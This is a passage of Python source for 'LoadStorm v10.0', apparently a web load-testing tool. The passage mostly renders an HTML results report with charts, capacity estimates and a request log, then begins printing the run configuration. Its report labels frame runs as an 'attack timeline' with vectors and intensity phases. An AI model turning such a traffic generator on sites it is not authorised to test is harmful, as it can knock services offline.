<div class="stat"><div class="val green">{m.validation_passes:,}</div><div class="lbl">Passed</div></div>
<div class="stat"><div class="val red">{m.validation_fails:,}</div><div class="lbl">Failed</div></div>
<div class="stat"><div class="val yellow">{m.validation_rate:.2f}%</div><div class="lbl">Validation Rate</div></div>
</div>"""

        if m.websocket_msgs > 0:
            html += f"""
<div class="card">
<h2>WebSocket Statistics</h2>
<div class="stat"><div class="val">{m.websocket_msgs:,}</div><div class="lbl">Messages</div></div>
<div class="stat"><div class="val">{m.websocket_bytes/1024:.2f} KB</div><div class="lbl">Data Transferred</div></div>
</div>"""

        html += f"""
<div class="card">
<h2>Error Breakdown</h2>
<table>
<tr><th>Type</th><th>Count</th></tr>
{err_rows}
<tr><th>Data Sent</th><td>{m.total_bytes_sent/1024/1024:.2f} MB</td></tr>
<tr><th>Data Received</th><td>{m.total_bytes_recv/1024/1024:.2f} MB</td></tr>
<tr><th>Connection Reuse</th><td>{s['conn_reuse']:.1f}%</td></tr>
</table></div>
<div class="card">
<h2>Status Codes</h2>
<table><tr><th>Code</th><th>Count</th></tr>
{sc_rows}</table></div>"""

        if m.per_url_metrics:
            html += """
<div class="card">
<h2>Per-URL Breakdown</h2>
<table><tr><th>URL</th><th>Requests</th><th>Errors</th><th>Avg Time</th></tr>"""
            for url, data in sorted(m.per_url_metrics.items(), key=lambda x: x[1]['requests'], reverse=True)[:15]:
                avg_t = data['total_time'] / max(1, data['requests'])
                html += f'<tr><td>{url[:50]}</td><td>{data["requests"]:,}</td><td>{data["errors"]:,}</td><td>{avg_t:.1f}ms</td></tr>'
            html += '</table></div>'

        if s['rate'] >= 99:
            verdict_style = 'background:#238636;color:#fff'
            verdict_text = 'EXCELLENT - Site handled load perfectly!'
        elif s['rate'] >= 90:
            verdict_style = 'background:#9e6a03;color:#fff'
            verdict_text = 'GOOD - Minor issues under load'
        elif s['rate'] >= 70:
            verdict_style = 'background:#bd561d;color:#fff'
            verdict_text = 'FAIR - Noticeable degradation'
        else:
            verdict_style = 'background:#da3633;color:#fff'
            verdict_text = 'CRITICAL - Site struggling under load!'

        if heat_cells:
            html += f"""
<div class="card">
<h2>Response Time Heatmap (v10.0)</h2>
<p style="color:#8b949e">Rows = latency bands, columns = successive 1-second windows. Darker cells = more requests.</p>
{heat_cells}
</div>"""

        if m.percentile_history:
            html += f"""
<div class="card">
<h2>Percentile Trend Over Time (v10.0)</h2>
<div class="chart-container"><canvas id="pctChart"></canvas></div>
<script>
new Chart(document.getElementById('pctChart'), {{
  type: 'line',
  data: {{
    labels: {p50_hist}.map((_, i) => i + 1),
    datasets: [
      {{ label: 'P50', data: {p50_hist}, borderColor: '#3fb950', tension: 0.3, fill: false }},
      {{ label: 'P95', data: {p95_hist}, borderColor: '#d29922', tension: 0.3, fill: false }},
      {{ label: 'P99', data: {p99_hist}, borderColor: '#f85149', tension: 0.3, fill: false }}
    ]
  }},
  options: {{
    responsive: true,
    maintainAspectRatio: false,
    scales: {{
      x: {{ title: {{ display: true, text: 'Second', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }},
      y: {{ title: {{ display: true, text: 'ms', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }}
    }},
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }}
  }}
}});
</script></div>"""

        if clusters['total_errors']:
            html += f"""
<div class="card">
<h2>Error Clustering Analysis (v10.0)</h2>
<div class="stat"><div class="val red">{clusters['total_errors']:,}</div><div class="lbl">Total Errors</div></div>
<div class="stat"><div class="val">{clusters['cluster_count']:,}</div><div class="lbl">Clusters</div></div>
<div class="stat"><div class="val yellow">{clusters['largest_cluster']:,}</div><div class="lbl">Largest Cluster</div></div>
<div class="stat"><div class="val">{clusters['mean_cluster_size']:.1f}</div><div class="lbl">Mean Cluster Size</div></div>
<div class="stat"><div class="val">{_html_escape(clusters['dominant_type'] or 'n/a')}</div><div class="lbl">Dominant Type</div></div>
<table><tr><th>#</th><th>Type</th><th>Count</th><th>Start</th><th>End</th><th>Duration</th></tr>
{cluster_rows}</table></div>"""

        html += f"""
<div class="card">
<h2>Resource Utilization Estimation (v10.0)</h2>
<div class="stat"><div class="val">{est['little_law_concurrency']:.1f}</div><div class="lbl">Little's Law Concurrency</div></div>
<div class="stat"><div class="val yellow">{est['est_server_cpu_cores']:.2f}</div><div class="lbl">Est. Server CPU Cores</div></div>
<div class="stat"><div class="val">{est['est_server_conn_memory_mb']:.1f}</div><div class="lbl">Est. Conn Memory (MB)</div></div>
<div class="stat"><div class="val green">{est['est_network_mbps']:.2f}</div><div class="lbl">Est. Network (MB/s)</div></div>
<div class="stat"><div class="val">{est['load_gen_max_rss_mb']:.1f}</div><div class="lbl">LoadGen Max RSS (MB)</div></div>
<div class="stat"><div class="val">{est['load_gen_avg_cpu_percent']:.1f}%</div><div class="lbl">LoadGen Avg CPU</div></div>
</div>

<div class="card">
<h2>Correlation IDs &amp; Assertions (v10.0)</h2>
<div class="stat"><div class="val">{m.correlation_ids_issued:,}</div><div class="lbl">Correlation IDs Issued</div></div>
<div class="stat"><div class="val green">{m.correlation_echoed:,}</div><div class="lbl">IDs Echoed by Server</div></div>
<div class="stat"><div class="val">{m.scenario_assert_pass:,}</div><div class="lbl">Assertions Passed</div></div>
<div class="stat"><div class="val red">{m.scenario_assert_fail:,}</div><div class="lbl">Assertions Failed</div></div>
<div class="stat"><div class="val yellow">{m.validation_rate:.1f}%</div><div class="lbl">Validation Pass Rate</div></div>
</div>"""

        if timeline['events']:
            html += f"""
<div class="card">
<h2>Interactive Attack Timeline (v10.0)</h2>
<p style="color:#8b949e">Hover or click timeline markers for event details. Colored bands show chain phases.</p>
<div class="tl-track" id="tlTrack"></div>
<div class="tl-labels"><span>0s</span><span>{timeline_duration:.0f}s</span></div>
<div class="tl-detail" id="tlDetail">Hover a marker or phase band…</div>
<div class="stat"><div class="val">{len(timeline['events']):,}</div><div class="lbl">Timeline Events</div></div>
<div class="stat"><div class="val">{len(timeline['phases'])}</div><div class="lbl">Chain Phases</div></div>
<div class="stat"><div class="val">{len(timeline['intensity_history'])}</div><div class="lbl">Intensity Adjustments</div></div>
<script>
const tlEvents = {timeline_json};
const tlDuration = {timeline_duration};
const tlPhases = {phases_json};
const tlIntensity = {intensity_json};
const palette = ['#58a6ff','#3fb950','#d29922','#f85149','#a371f7','#39c5cf'];
(function() {{
  const track = document.getElementById('tlTrack');
  const detail = document.getElementById('tlDetail');
  (tlPhases || []).forEach((ph, i) => {{
    const div = document.createElement('div');
    div.className = 'tl-phase';
    const left = Math.max(0, (ph.start_s / tlDuration) * 100);
    const width = Math.max(1, ((ph.end_s - ph.start_s) / tlDuration) * 100);
    div.style.left = left + '%';
    div.style.width = width + '%';
    div.style.background = palette[i % palette.length];
    div.title = ph.pattern + ' ' + ph.start_s + 's - ' + ph.end_s + 's';
    div.addEventListener('mouseenter', () => {{
      detail.textContent = 'Phase: ' + ph.pattern + ' | ' + ph.start_s + 's -> ' + ph.end_s + 's';
    }});
    track.appendChild(div);
  }});
  (tlEvents || []).forEach(ev => {{
    const dot = document.createElement('div');
    dot.className = 'tl-event';
    const x = Math.min(98, Math.max(0, (ev.t / tlDuration) * 100));
    dot.style.left = x + '%';
    const colors = {{ phase:'#3fb950', scale:'#f85149', intensity:'#d29922', vector:'#a371f7', error_spike:'#f85149', start:'#58a6ff', bottleneck:'#f85149', auto_tune:'#39c5cf' }};
    dot.style.background = colors[ev.type] || '#8b949e';
    dot.title = 't=' + ev.t + 's [' + ev.type + '] ' + (ev.label || '');
    dot.addEventListener('mouseenter', () => {{
      detail.textContent = 't=' + ev.t + 's | ' + ev.type + ' | ' + (ev.label || '');
    }});
    track.appendChild(dot);
  }});
}})();
</script>
</div>"""

        html += f"""
<div class="card">
<h2>Response Time Box Plot (v10.0)</h2>
<div class="stat"><div class="val">{box.get('q1', 0):.1f}</div><div class="lbl">Q1 (ms)</div></div>
<div class="stat"><div class="val">{box.get('median', 0):.1f}</div><div class="lbl">Median (ms)</div></div>
<div class="stat"><div class="val">{box.get('q3', 0):.1f}</div><div class="lbl">Q3 (ms)</div></div>
<div class="stat"><div class="val">{box.get('iqr', 0):.1f}</div><div class="lbl">IQR (ms)</div></div>
<div class="stat"><div class="val yellow">{box.get('whisker_low', 0):.1f}</div><div class="lbl">Lower Whisker</div></div>
<div class="stat"><div class="val yellow">{box.get('whisker_high', 0):.1f}</div><div class="lbl">Upper Whisker</div></div>
<div class="stat"><div class="val red">{box.get('outliers', 0):,}</div><div class="lbl">Outliers</div></div>
<table>
<tr><th>Statistic</th><th>Value (ms)</th></tr>
<tr><td>Min</td><td>{box.get('min', 0)}</td></tr>
<tr><td>Q1</td><td>{box.get('q1', 0)}</td></tr>
<tr><td>Median</td><td>{box.get('median', 0)}</td></tr>
<tr><td>Q3</td><td>{box.get('q3', 0)}</td></tr>
<tr><td>Max</td><td>{box.get('max', 0)}</td></tr>
</table>
</div>

<div class="card">
<h2>Error Correlation &amp; Degradation (v10.0)</h2>
<div class="stat"><div class="val">{err_corr.get('rps_vs_error_r', 0):.3f}</div><div class="lbl">RPS vs Errors (r)</div></div>
<div class="stat"><div class="val">{err_corr.get('response_time_vs_error_r', 0):.3f}</div><div class="lbl">RT vs Errors (r)</div></div>
<div class="stat"><div class="val">{err_corr.get('rps_vs_response_time_r', 0):.3f}</div><div class="lbl">RPS vs RT (r)</div></div>
<div class="stat"><div class="val {'red' if deg.get('detected') else 'green'}">{_html_escape(deg.get('severity', 'none'))}</div><div class="lbl">Degradation Severity</div></div>
<div class="stat"><div class="val">{deg.get('confidence', 0):.2f}</div><div class="lbl">Degradation Confidence</div></div>
<p style="color:#8b949e">{_html_escape(err_corr.get('interpretation', ''))} — {_html_escape(deg.get('details', ''))}</p>
</div>

<div class="card">
<h2>Server Capacity Estimation (v10.0)</h2>
<div class="stat"><div class="val green">{cap.get('max_stable_rps', 0):.1f}</div><div class="lbl">Max Stable RPS</div></div>
<div class="stat"><div class="val yellow">{cap.get('knee_rps', 0):.1f}</div><div class="lbl">Knee RPS</div></div>
<div class="stat"><div class="val">{cap.get('capacity_headroom_pct', 0):.1f}%</div><div class="lbl">Capacity Headroom</div></div>
<div class="stat"><div class="val">{cap.get('projected_max_rps_25pct', 0):.1f}</div><div class="lbl">Projected Max RPS</div></div>
<div class="stat"><div class="val">{cap.get('concurrency_at_capacity', 0):.1f}</div><div class="lbl">Concurrency @ Capacity</div></div>
<div class="stat"><div class="val {'red' if cap.get('saturated') else 'green'}">{'YES' if cap.get('saturated') else 'no'}</div><div class="lbl">Saturated</div></div>
<p style="color:#8b949e">Estimated bottleneck: {_html_escape(cap.get('estimated_bottleneck', 'unknown'))}</p>
</div>"""

        hs = m.health_score()
        err_pred = m.error_rate_prediction()
        p_ev = m.percentile_evolution()
        te = m.throughput_efficiency()
        bn = self._realtime_bottleneck()
        conn_h = self.connection_health()
        health_hist_json = json.dumps([
            {'t': h.get('t', 0), 'score': h.get('score', 0)}
            for h in (m.health_score_history or [])[-200:]
        ])
        pred30 = err_pred.get('predicted_error_rate_30s', 0)
        pred60 = err_pred.get('predicted_error_rate_60s', 0)
        current_err = err_pred.get('current_error_rate', m.error_rate)
        pred_series = json.dumps([
            round(current_err, 2),
            round(pred30, 2),
            round(pred60, 2),
        ])
        health_color = ('#3fb950' if hs.get('score', 0) >= 80
                        else '#d29922' if hs.get('score', 0) >= 60
                        else '#f85149')
        bn_color = ('#3fb950' if bn.get('severity') == 'healthy'
                    else '#d29922' if bn.get('severity') == 'mild'
                    else '#f85149')
        conn_status = conn_h.get('status', 'unknown')
        conn_color = ('#3fb950' if conn_status == 'healthy'
                      else '#d29922' if conn_status in ('degraded', 'no recent samples')
                      else '#f85149')

        html += f"""
<div class="card">
<h2>Server Health Score (v10.0)</h2>
<div class="stat"><div class="val" style="color:{health_color}">{hs.get('score', 0):.1f}</div><div class="lbl">Health Score</div></div>
<div class="stat"><div class="val" style="color:{health_color}">{_html_escape(hs.get('grade', 'F'))}</div><div class="lbl">Grade</div></div>
<div class="stat"><div class="val">{_html_escape(hs.get('status', 'unknown'))}</div><div class="lbl">Status</div></div>
<div class="stat"><div class="val">{hs.get('components', {}).get('error', 0):.1f}</div><div class="lbl">Error Component</div></div>
<div class="stat"><div class="val">{hs.get('components', {}).get('latency', 0):.1f}</div><div class="lbl">Latency Component</div></div>
<div class="stat"><div class="val">{hs.get('components', {}).get('connection', 0):.1f}</div><div class="lbl">Connection Component</div></div>
<p style="color:#8b949e">{_html_escape(hs.get('interpretation', ''))}</p>
<div class="chart-container" style="height:200px"><canvas id="healthHistChart"></canvas></div>
<script>
new Chart(document.getElementById('healthHistChart'), {{
  type: 'line',
  data: {{
    labels: {health_hist_json}.map(p => p.t),
    datasets: [{{
      label: 'Health Score',
      data: {health_hist_json}.map(p => p.score),
      borderColor: '{health_color}',
      tension: 0.3,
      fill: true,
      backgroundColor: 'rgba(63,185,80,0.08)'
    }}]
  }},
  options: {{
    responsive: true, maintainAspectRatio: false,
    scales: {{
      x: {{ title: {{ display: true, text: 'Elapsed (s)', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }},
      y: {{ min: 0, max: 100, title: {{ display: true, text: 'Score', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }}
    }},
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }}
  }}
}});
</script>
</div>

<div class="card">
<h2>Error Rate Prediction (v10.0)</h2>
<div class="stat"><div class="val">{current_err:.2f}%</div><div class="lbl">Current Error Rate</div></div>
<div class="stat"><div class="val yellow">{pred30:.2f}%</div><div class="lbl">Predicted +30s</div></div>
<div class="stat"><div class="val red">{pred60:.2f}%</div><div class="lbl">Predicted +60s</div></div>
<div class="stat"><div class="val">{_html_escape(str(err_pred.get('trend', 'unknown')))}</div><div class="lbl">Trend</div></div>
<div class="stat"><div class="val {'red' if err_pred.get('risk_level') in ('high', 'elevated') else 'green'}">{_html_escape(str(err_pred.get('risk_level', 'unknown')))}</div><div class="lbl">Risk Level</div></div>
<div class="stat"><div class="val">{err_pred.get('confidence', 0):.2f}</div><div class="lbl">Model Confidence</div></div>
<div class="stat"><div class="val">{err_pred.get('r_squared', 0):.3f}</div><div class="lbl">R²</div></div>
<div class="stat"><div class="val">{err_pred.get('breach_seconds_to_5pct') if err_pred.get('breach_seconds_to_5pct') is not None else 'n/a'}</div><div class="lbl">Secs to 5% Breach</div></div>
<div class="chart-container" style="height:180px"><canvas id="errPredChart"></canvas></div>
<script>
new Chart(document.getElementById('errPredChart'), {{
  type: 'line',
  data: {{
    labels: ['now', '+30s', '+60s'],
    datasets: [{{
      label: 'Error Rate % (projected)',
      data: {pred_series},
      borderColor: '#d29922',
      borderDash: [6, 4],
      tension: 0.2,
      fill: false
    }}]
  }},
  options: {{
    responsive: true, maintainAspectRatio: false,
    scales: {{
      x: {{ ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }},
      y: {{ min: 0, title: {{ display: true, text: '%', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }}
    }},
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }}
  }}
}});
</script>
<p style="color:#8b949e">{_html_escape(err_pred.get('method', 'OLS extrapolation'))} — slope {err_pred.get('slope_per_sec', 0):.5f}/s</p>
</div>

<div class="card">
<h2>Percentile Evolution (v10.0)</h2>
<div class="stat"><div class="val">{_html_escape(str((p_ev.get('p50') or {}).get('direction', 'n/a')))}</div><div class="lbl">P50 Direction</div></div>
<div class="stat"><div class="val">{_html_escape(str((p_ev.get('p95') or {}).get('direction', 'n/a')))}</div><div class="lbl">P95 Direction</div></div>
<div class="stat"><div class="val">{_html_escape(str((p_ev.get('p99') or {}).get('direction', 'n/a')))}</div><div class="lbl">P99 Direction</div></div>
<div class="stat"><div class="val">{(p_ev.get('p95') or {}).get('slope_per_sec', 0):.3f}</div><div class="lbl">P95 Slope (ms/s)</div></div>
<div class="stat"><div class="val">{p_ev.get('convergence_pct', 0):.1f}%</div><div class="lbl">P99-P50 Convergence</div></div>
<div class="stat"><div class="val">{_html_escape(str(p_ev.get('stability', 'unknown')))}</div><div class="lbl">Stability</div></div>
<div class="stat"><div class="val">{p_ev.get('projected_p95_ms', 0):.1f}</div><div class="lbl">Projected P95 (+30s)</div></div>
<p style="color:#8b949e">{_html_escape(p_ev.get('interpretation', 'No percentile evolution data.'))}</p>
</div>

<div class="card">
<h2>Throughput Efficiency (v10.0)</h2>
<div class="stat"><div class="val">{te.get('efficiency_pct', 0):.1f}%</div><div class="lbl">Efficiency</div></div>
<div class="stat"><div class="val">{te.get('bytes_per_request', 0):.0f}</div><div class="lbl">Bytes/Request</div></div>
<div class="stat"><div class="val">{te.get('bandwidth_utilization', 0):.1%}</div><div class="lbl">Bandwidth Utilization</div></div>
<div class="stat"><div class="val">{te.get('pipeline_efficiency', 0):.1%}</div><div class="lbl">Pipeline Efficiency</div></div>
<div class="stat"><div class="val">{te.get('rps_stability', 0):.2f}</div><div class="lbl">RPS Stability</div></div>
<div class="stat"><div class="val yellow">{_html_escape(str(te.get('saturation', 'unknown')))}</div><div class="lbl">Saturation</div></div>
<p style="color:#8b949e">{_html_escape(te.get('interpretation', 'No throughput data.'))}</p>
</div>

<div class="card">
<h2>Real-Time Bottleneck Detection (v10.0)</h2>
<div class="stat"><div class="val" style="color:{bn_color}">{_html_escape(str(bn.get('primary', 'none')))}</div><div class="lbl">Primary Bottleneck</div></div>
<div class="stat"><div class="val" style="color:{bn_color}">{_html_escape(str(bn.get('severity', 'healthy')))}</div><div class="lbl">Severity</div></div>
<div class="stat"><div class="val">{bn.get('confidence', 0):.2f}</div><div class="lbl">Confidence</div></div>
<div class="stat"><div class="val">{bn.get('window_p95_ms', 0):.0f}ms</div><div class="lbl">Window P95</div></div>
<div class="stat"><div class="val">{bn.get('window_error_rate', 0):.1f}%</div><div class="lbl">Window Error Rate</div></div>
<p style="color:#8b949e">{_html_escape(bn.get('detail', ''))}</p>
<ul style="color:#8b949e">"""
        for signal in (bn.get('signals') or [])[:8]:
            html += f"<li>{_html_escape(signal)}</li>\n"
        html += """</ul>
</div>

<div class="card">
<h2>Connection Health Monitoring (v10.0)</h2>
<div class="stat"><div class="val" style="color:{COLOR}">{STATUS}</div><div class="lbl">Status</div></div>
<div class="stat"><div class="val green">{OVERALL}%</div><div class="lbl">Overall Success</div></div>
<div class="stat"><div class="val">{WINDOW}%</div><div class="lbl">30s Window Success</div></div>
<div class="stat"><div class="val">{SAMPLES}</div><div class="lbl">Window Samples</div></div>
<div class="stat"><div class="val">{CONNECT}ms</div><div class="lbl">Avg Connect</div></div>
<div class="stat"><div class="val red">{MAXFAIL}</div><div class="lbl">Max Consecutive Fails</div></div>
<div class="stat"><div class="val">{WORKERS}</div><div class="lbl">Tracked Workers</div></div>
</div>""".replace('{COLOR}', _html_escape(str(conn_color))).replace('{STATUS}', _html_escape(str(conn_status))).replace(
            '{OVERALL}', f"{conn_h.get('overall_success_pct', 0):.1f}").replace(
            '{WINDOW}', f"{conn_h.get('window_success_pct', 0):.1f}").replace(
            '{SAMPLES}', str(conn_h.get('window_samples', 0))).replace(
            '{CONNECT}', f"{conn_h.get('avg_connect_ms', 0):.1f}").replace(
            '{MAXFAIL}', str(conn_h.get('max_consecutive_failures', 0))).replace(
            '{WORKERS}', str(conn_h.get('tracked_workers', 0)))

        auto_enabled = bool(self.cfg.get('auto_tune', False))
        smart_enabled = bool(self.cfg.get('smart_distribution', False))
        html += f"""
<div class="card">
<h2>Adaptive Controls (v10.0)</h2>
<div class="stat"><div class="val {'green' if auto_enabled else ''}">{'ON' if auto_enabled else 'OFF'}</div><div class="lbl">Auto-Tuning</div></div>
<div class="stat"><div class="val">{self._auto_tune_state.get('adjustments', 0)}</div><div class="lbl">Auto-Tune Adjustments</div></div>
<div class="stat"><div class="val">{self._auto_tune_state.get('target_worker_delay', 0):.3f}s</div><div class="lbl">Final Worker Delay</div></div>
<div class="stat"><div class="val">{'ON' if smart_enabled else 'OFF'}</div><div class="lbl">Smart Distribution</div></div>
<div class="stat"><div class="val">{len(m.smart_url_picks)}</div><div class="lbl">URLs Load-Balanced</div></div>
<div class="stat"><div class="val">{m.graphql_queries_sent:,}</div><div class="lbl">GraphQL Queries</div></div>
<div class="stat"><div class="val">{m.rest_requests_sent:,}</div><div class="lbl">REST Requests</div></div>
<div class="stat"><div class="val">{m.ws_chat_messages_sent:,}</div><div class="lbl">WS Chat Messages</div></div>
</div>"""

        html += """
<div class="card">
<h2>Real-Time Simulation (v10.0)</h2>
<p style="color:#8b949e">Replays the recorded run second-by-second. Use the controls to play, pause, or scrub the timeline.</p>
<div class="filter-bar">
  <button id="simPlay" onclick="simToggle()">Play</button>
  <button onclick="simReset()">Reset</button>
  <label>Speed <select id="simSpeed" onchange="simSetSpeed(this.value)">
    <option value="0.5">0.5x</option>
    <option value="1" selected>1x</option>
    <option value="2">2x</option>
    <option value="5">5x</option>
    <option value="10">10x</option>
  </select></label>
  <label>Scrub <input type="range" id="simScrub" min="0" max="100" value="100" oninput="simScrubTo(this.value)" style="width:220px"></label>
  <span id="simStatus" style="color:#8b949e;font-family:monospace">t=0s</span>
</div>
<div class="chart-container" style="height:280px"><canvas id="simChart"></canvas></div>
<script>
const SIM_RPS = """ + json.dumps([round(v, 2) for v in list(m._rps_history)[-300:]]) + """;
const SIM_ERR = """ + json.dumps([round(v, 2) for v in list(m._error_rate_history)[-300:]]) + """;
const SIM_RT = """ + json.dumps([round(v, 2) for v in list(m._response_times_history)[-300:]]) + """;
const SIM_TOTAL = """ + json.dumps(int(m.total_requests)) + """;
let simIdx = SIM_RPS.length;
let simTimer = null;
let simRate = 1;
const simChart = new Chart(document.getElementById('simChart'), {
  type: 'line',
  data: {
    labels: SIM_RPS.map((_, i) => i + 1),
    datasets: [
      { label: 'RPS', data: SIM_RPS, borderColor: '#58a6ff', tension: 0.3, fill: false, yAxisID: 'y' },
      { label: 'Error %', data: SIM_ERR, borderColor: '#f85149', tension: 0.3, fill: false, yAxisID: 'y1' },
      { label: 'Avg ms', data: SIM_RT, borderColor: '#d29922', tension: 0.3, fill: false, yAxisID: 'y1' }
    ]
  },
  options: {
    responsive: true, maintainAspectRatio: false,
    animation: false,
    scales: {
      x: { title: { display: true, text: 'Second', color: '#8b949e' }, ticks: { color: '#8b949e' }, grid: { color: '#30363d' } },
      y: { position: 'left', title: { display: true, text: 'RPS', color: '#8b949e' }, ticks: { color: '#8b949e' }, grid: { color: '#30363d' } },
      y1: { position: 'right', title: { display: true, text: '% / ms', color: '#8b949e' }, ticks: { color: '#8b949e' }, grid: { drawOnChartArea: false } }
    },
    plugins: { legend: { labels: { color: '#c9d1d9' } } }
  }
});
function simRender() {
  const n = SIM_RPS.length;
  simIdx = Math.max(0, Math.min(n, simIdx));
  const cut = arr => arr.slice(0, simIdx);
  const labels = Array.from({ length: simIdx }, (_, i) => i + 1);
  simChart.data.labels = labels;
  simChart.data.datasets[0].data = cut(SIM_RPS);
  simChart.data.datasets[1].data = cut(SIM_ERR);
  simChart.data.datasets[2].data = cut(SIM_RT);
  simChart.update(0);
  const frac = n > 0 ? simIdx / n : 1;
  const done = Math.round(SIM_TOTAL * frac);
  document.getElementById('simStatus').textContent = 't=' + simIdx + 's / ' + n + 's  requests=' + done;
  document.getElementById('simScrub').value = Math.round(frac * 100);
}
function simToggle() {
  if (simTimer) { clearInterval(simTimer); simTimer = null; document.getElementById('simPlay').textContent = 'Play'; return; }
  if (simIdx >= SIM_RPS.length) simIdx = 0;
  document.getElementById('simPlay').textContent = 'Pause';
  const stepMs = Math.max(20, 1000 / simRate);
  simTimer = setInterval(() => {
    simIdx += 1;
    if (simIdx >= SIM_RPS.length) { simIdx = SIM_RPS.length; clearInterval(simTimer); simTimer = null; document.getElementById('simPlay').textContent = 'Play'; }
    simRender();
  }, stepMs);
}
function simReset() {
  if (simTimer) { clearInterval(simTimer); simTimer = null; }
  document.getElementById('simPlay').textContent = 'Play';
  simIdx = 0;
  simRender();
}
function simSetSpeed(v) { simRate = parseFloat(v) || 1; }
function simScrubTo(pct) {
  if (simTimer) { clearInterval(simTimer); simTimer = null; document.getElementById('simPlay').textContent = 'Play'; }
  simIdx = Math.round(SIM_RPS.length * (parseInt(pct, 10) / 100));
  simRender();
}
simRender();
</script>
</div>
"""

        if sample_logs:
            html += f"""
<div class="card">
<h2>Request Log with Interactive Filters (v10.0)</h2>
<div class="filter-bar">
  <input type="text" id="fSearch" placeholder="Filter by URL or correlation ID..." oninput="applyFilters()" style="min-width:260px">
  <label><input type="checkbox" class="fcls" value="2xx" checked onchange="applyFilters()"> 2xx</label>
  <label><input type="checkbox" class="fcls" value="3xx" checked onchange="applyFilters()"> 3xx</label>
  <label><input type="checkbox" class="fcls" value="4xx" checked onchange="applyFilters()"> 4xx</label>
  <label><input type="checkbox" class="fcls" value="5xx" checked onchange="applyFilters()"> 5xx</label>
  <label><input type="checkbox" class="fcls" value="err" checked onchange="applyFilters()"> Errors</label>
  <label>Min ms <input type="number" id="fMinRt" value="0" min="0" onchange="applyFilters()" style="width:80px"></label>
  <label>Max ms <input type="number" id="fMaxRt" value="999999" min="0" onchange="applyFilters()" style="width:90px"></label>
  <button onclick="resetFilters()">Reset</button>
</div>
<table id="reqTable">
<thead><tr><th>URL</th><th>Status</th><th>ms</th><th>Bytes</th><th>Correlation ID</th><th>Error</th><th>Snippet</th></tr></thead>
<tbody>
{log_rows_html}
</tbody></table>
        <script>
function applyFilters() {{
  const q = document.getElementById('fSearch').value.toLowerCase();
  const classes = Array.from(document.querySelectorAll('.fcls:checked')).map(x => x.value);
  const minRt = parseFloat(document.getElementById('fMinRt').value) || 0;
  const maxRt = parseFloat(document.getElementById('fMaxRt').value) || 999999;
  document.querySelectorAll('#reqTable tbody tr').forEach(tr => {{
    const url = (tr.dataset.url || '').toLowerCase();
    const corrId = (tr.cells[4] ? tr.cells[4].textContent : '').toLowerCase();
    const cls = tr.dataset.cls;
    const rt = parseFloat(tr.dataset.rt) || 0;
    const ok = (!q || url.includes(q) || corrId.includes(q))
      && classes.includes(cls)
      && rt >= minRt && rt <= maxRt;
    tr.style.display = ok ? '' : 'none';
  }});
}}
function resetFilters() {{
  document.getElementById('fSearch').value = '';
  document.getElementById('fMinRt').value = 0;
  document.getElementById('fMaxRt').value = 999999;
  document.querySelectorAll('.fcls').forEach(x => x.checked = true);
  applyFilters();
}}
</script>
</div>"""

        html += f"""
<div class="verdict" style="{verdict_style}">{verdict_text}</div>
<p style="color:#8b949e;text-align:center">Generated by LoadStorm v10.0 | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
</body></html>"""

        with open(path, 'w') as f:
            f.write(html)
        print(f"    {Fore.GREEN}[+] HTML report saved: {path}{Style.RESET_ALL}")

    async def run(self):
        import shutil
        cols = shutil.get_terminal_size((80, 24)).columns
        if cols < 78:
            print(f"\n    {Fore.RED}[!] Terminal too narrow ({cols} cols). Need 78+. Use --no-color.{Style.RESET_ALL}")
            return

        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)

        urls = self.cfg.get('urls', [self.cfg['url']])
        print(f"    {Fore.YELLOW}TEST CONFIGURATION{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}{'-'*74}{Style.RESET_ALL}")
        if len(urls) > 1:
            print(f"    {Fore.WHITE}Mode:{Style.RESET_ALL}           {Fore.GREEN}Multi-URL ({len(urls)} targets){Style.RESET_ALL}")
            for i, u in enumerate(urls[:5], 1):
                print(f"    {Fore.WHITE}  URL {i}:{Style.RESET_ALL}       {Fore.GREEN}{u[:59]}{Style.RESET_ALL}")
            if len(urls) > 5:
                print(f"    {Fore.WHITE}  ... and {len(urls)-5} more{Style.RESET_ALL}")
        else:
            print(f"    {Fore.WHITE}Target URL:{Style.RESET_ALL}     {Fore.GREEN}{self.cfg['url']}{Style.RESET_ALL}")
        print(f"    {Fore.WHITE}Total Users:{Style.RESET_ALL}    {Fore.GREEN}{self.cfg['users']:,}{Style.RESET_ALL}")
        print(f"    {Fore.WHITE}Concurrency:{Style.RESET_ALL}    {Fore.GREEN}{self.cfg['concurrency']:,}{Style.RESET_ALL}")
        print(f"    {Fore.WHITE}Duration:{Style.RESET_ALL}       {Fore.GREEN}{self.cfg['duration']}s{Style.RESET_ALL}")
        print(f"    {Fore.WHITE}Method:{Style.RESET_ALL}         {Fore.GREEN}{self.cfg['method']}{Style.RESET_ALL}")
        print(f"    {Fore.WHITE}Pattern:{Style.RESET_ALL}        {Fore.GREEN}{self.cfg['pattern'].value}{Style.RESET_ALL}")
        print(f"    {Fore.WHITE}Keep-Alive:{Style.RESET_ALL}     {Fore.GREEN}{'Yes' if self.cfg['keep_alive'] else 'No'}{Style.RESET_ALL}")
        if self.cfg.get('http2'):
            print(f"    {Fore.WHITE}HTTP/2:{Style.RESET_ALL}        {Fore.GREEN}Enabled{Style.RESET_ALL}")
        if self.cfg.get('websocket'):
            print(f"    {Fore.WHITE}WebSocket:{Style.RESET_ALL}     {Fore.GREEN}Enabled{Style.RESET_ALL}")
        if self.cfg.get('geo_simulation'):
            print(f"    {Fore.WHITE}Geo Sim:{Style.RESET_ALL}       {Fore.GREEN}Enabled (6 regions){Style.RESET_ALL}")
        if self.cfg.get('adaptive_rate'):
            print(f"    {Fore.WHITE}Adaptive:{Style.RESET_ALL}      {Fore.GREEN}Enabled{Style.RESET_ALL}")
        if self.cfg.get('dynamic_scale'):
